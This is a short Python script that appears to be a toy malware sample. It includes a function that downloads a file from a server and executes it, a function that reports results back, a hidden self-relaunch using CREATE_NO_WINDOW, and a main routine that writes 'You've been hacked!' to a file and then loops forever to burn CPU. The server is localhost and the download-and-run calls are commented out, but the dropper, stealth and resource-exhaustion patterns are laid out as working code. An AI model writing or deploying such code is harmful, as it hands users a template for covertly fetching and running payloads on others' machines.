import requests
import subprocess
import shutil
import os
import sys

# URL of the API server
API_URL = "http://localhost:5000"

def download_and_execute():
    # Download the file
    response = requests.get(f"{API_URL}/download")
    filename = 'downloaded_file.txt'

    with open(filename, 'wb') as file:
        file.write(response.content)

    # Execute the file (safely and benignly)
    subprocess.run(["python3", filename], check=True)

    return filename

def report_result(result):
    requests.post(f"{API_URL}/report", json={"result": result})

def main():
    # result = download_and_execute()
    # report_result(result)
    with open("malware.txt", "w") as file:
        file.write("You've been hacked!")

    while True:
        pass

if __name__ == "__main__":
    # Check the first argument to be "hidden"
    if len(sys.argv) == 2 and sys.argv[1] == "hidden":
        main()
    else:
        # Execute the script in a hidden manner
        print(sys.argv[0])
        subprocess.Popen([sys.argv[0], 'hidden'], creationflags=subprocess.CREATE_NO_WINDOW)

